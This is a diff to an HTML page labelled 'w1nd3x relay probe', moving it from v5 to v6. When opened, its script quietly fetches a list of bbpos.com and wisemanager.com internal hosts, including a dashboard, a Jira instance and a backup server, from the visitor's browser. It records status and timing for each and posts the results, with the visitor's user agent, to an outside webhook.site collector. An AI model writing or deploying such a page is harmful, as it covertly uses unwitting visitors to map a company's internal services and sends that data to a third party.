@@ -1,5 +1,5 @@
-<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe5</title></head>
-<body><h1>w1nd3x relay probe v5</h1><pre id="out"></pre>
+<!doctype html><html><head><meta charset="utf-8"><title>w1nd3x-probe6</title></head>
+<body><h1>w1nd3x relay probe v6</h1><pre id="out"></pre>
 <script>
 const WH="https://webhook.site/50d69fd6-da64-4eff-b409-5274db2c23ab";
 const RUN=Math.random().toString(36).slice(2,8);
@@ -8,6 +8,7 @@ function send(obj){ try{ fetch(WH,{method:'POST',mode:'no-cors',headers:{'Conten
 const T=[
  ["dss-Home","GET","https://developer.bbpos.com/Home"],
  ["dss-login","GET","https://developer.bbpos.com/login"],
+ ["dss-docs","GET","https://developer.bbpos.com/docs"],
  ["tms-root","GET","https://tms.bbpos.com/"],
  ["tms-dash","GET","https://tms.bbpos.com/dashboard"],
  ["wm-root","GET","https://portal.wisemanager.com/"],
@@ -17,19 +18,24 @@ const T=[
  ["ctl-jira-root","GET","https://bugs.bbpos.com/"],
  ["ctl-200","GET","https://example.com/"],
  ["ctl-emmsstatic","GET","https://api-static.emms.bbpos.com/"],
- ["ctl-bmsbackup","GET","https://bms-backup.bbpos.com/"]
+ ["ctl-bmsbackup","GET","https://bms-backup.bbpos.com/"],
+ ["ctl-redir","GET","https://httpbingo.org/redirect/1"]
 ];
 async function probe(label,m,u){
  const q=u+(u.includes('?')?'&':'?')+"w1="+RUN;
  const t0=performance.now(); let o={l:label,m:m};
- try{ const r=await fetch(q,{method:m,mode:'no-cors',redirect:'manual',credentials:'omit'}); o.t=r.type; }
- catch(e){ o.e=String(e).slice(0,50); }
- o.ms=Math.round(performance.now()-t0); RES.push(o);
+ try{ const r=await fetch(q,{method:m,mode:'cors',redirect:'manual',credentials:'omit'}); o.t=r.type; o.s=r.status; }
+ catch(e){ o.e=String(e).slice(0,40); }
+ o.ms=Math.round(performance.now()-t0);
+ // second pass: plain no-cors follow, for timing
+ const t1=performance.now();
+ try{ await fetch(q+"&p2=1",{method:m,mode:'no-cors',credentials:'omit'}); o.ms2=Math.round(performance.now()-t1);}catch(e){o.e2=1;}
+ RES.push(o);
  document.getElementById('out').textContent+="\n"+JSON.stringify(o);
 }
 (async()=>{
  for(const t of T){ await probe(t[0],t[1],t[2]); }
- send({run:RUN,v:5,ua:navigator.userAgent.slice(0,55),res:RES});
+ send({run:RUN,v:6,ua:navigator.userAgent.slice(0,55),res:RES});
  await new Promise(r=>setTimeout(r,2500));
 })();
 </script></body></html>
